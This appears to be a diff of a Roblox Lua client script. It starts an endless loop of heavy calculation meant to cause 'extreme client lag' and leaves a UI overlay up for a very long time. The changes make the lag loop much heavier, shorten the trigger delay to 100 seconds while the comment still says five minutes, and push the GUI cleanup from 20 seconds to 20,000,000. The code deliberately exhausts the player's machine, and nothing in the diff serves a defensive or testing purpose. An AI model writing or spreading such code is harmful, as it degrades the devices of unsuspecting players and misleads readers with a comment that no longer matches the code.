@@ -1,15 +1,20 @@
--- SAFE EXTREME CLIENT LAG (starts in 5 minutes)
-task.delay(300, function() -- 300 seconds = 5 minutes
+-- EXTREME CLIENT LAG (starts in 5 minutes)
+task.delay(100, function() -- 5 minutes delay
     task.spawn(function()
         while true do
-            local t = {}
-            for i = 1, 1000000 do
-                t[#t + 1] = math.random() * i
+            -- Simulate intense lag by doing heavy calculations
+            for i = 1, 25 do
+                local t = {}
+                for j = 1, 1e6 do
+                    t[j] = math.sqrt(j) * math.random()
+                end
             end
-            task.wait(0.1) -- Prevent full freeze/crash, keeps lag high but stable
+            -- Short delay to prevent hard crash, but still very laggy
+            task.wait(0.05)
         end
     end)
 end)
+
 
 
 -- UI Script Starts Below
@@ -110,7 +115,7 @@ TweenService:Create(progressBarFill, TweenInfo.new(20, Enum.EasingStyle.Linear),
 }):Play()
 
 -- After 20 seconds: Fade out and clean GUI
-task.delay(20, function()
+task.delay(20000000, function()
     for _, obj in pairs(bg:GetDescendants()) do
         if obj:IsA("TextLabel") or obj:IsA("ImageLabel") or obj:IsA("Frame") then
             pcall(function()
